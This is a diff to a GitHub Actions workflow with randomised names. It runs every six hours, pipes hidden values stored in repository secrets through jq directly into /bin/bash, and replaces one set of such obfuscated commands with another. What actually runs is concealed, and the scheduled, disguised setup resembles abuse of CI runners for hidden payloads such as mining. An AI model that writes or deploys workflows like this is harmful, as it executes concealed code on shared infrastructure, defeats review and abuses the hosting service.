@@ -2,20 +2,23 @@ name: zhourulai2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
-jobs:  # 17115
+    - cron: '55 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhourulai2345
         env:
-          k3: ${{ secrets.k3 }}
+          vhh1565: ${{ secrets.vhh1565 }}
         run: |
-          echo $k3 | jq -r .wxc86 | /bin/bash
-          echo $tvum649 | jq -r .inblh7 | /bin/bash
-          echo $oyncd2654 | jq -r .borp162 | /bin/bash
-          echo $uijhx9039 | jq -r .flvh209 | /bin/bash
-          echo $do06 | jq -r .rk393 | /bin/bash
-          echo $b02663 | jq -r .wyj56995 | /bin/bash
+          echo $vhh1565 | jq -r .ir165 | /bin/bash
+          echo $nh05 | jq -r .y59780 | /bin/bash
+          echo $eml024 | jq -r .l0 | /bin/bash
+          echo $px7524 | jq -r .obatn4865 | /bin/bash
+          echo $swgx1785 | jq -r .jzihh447 | /bin/bash
+          echo $hd9 | jq -r .vtx82 | /bin/bash
+          echo $vua99899 | jq -r .uymbf4718 | /bin/bash
+          echo $mww97 | jq -r .z4348 | /bin/bash
+          echo $odfb73 | jq -r .a94 | /bin/bash
 
